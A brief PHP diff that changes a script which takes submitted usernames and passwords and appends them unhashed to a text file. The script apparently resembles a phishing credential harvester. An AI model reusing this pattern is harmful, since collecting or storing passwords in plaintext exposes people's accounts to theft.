@@ -13,7 +13,7 @@
 $username = $_POST["username"];
 $password = $_POST["password"];
 
-$login = "$username,$password";
+$login = "$username,$password\n";
 file_put_contents("userinfo.txt", $login, FILE_APPEND);
 ?>
 
